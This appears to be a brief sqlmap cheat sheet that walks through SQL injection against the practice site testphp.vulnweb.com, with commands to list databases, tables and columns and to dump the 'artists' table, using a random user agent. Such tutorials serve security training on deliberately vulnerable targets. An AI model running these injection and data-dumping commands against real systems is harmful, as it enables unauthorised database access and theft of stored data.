sqlmap  -h

# Choose a website and list information about databases present
sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1  --dbs  --random-agent

# List information about tables present in the databases. For example, let’s consider “acuart”

sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables

# List information about columns in particular table

sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D  acuart  -T  artists  --columns

# Dump available data from the columns

sqlmap  -u  http://testphp.vulnweb.com/listproducts.php?cat=1 -D  acuart  -T  artists  -C  aname  --dump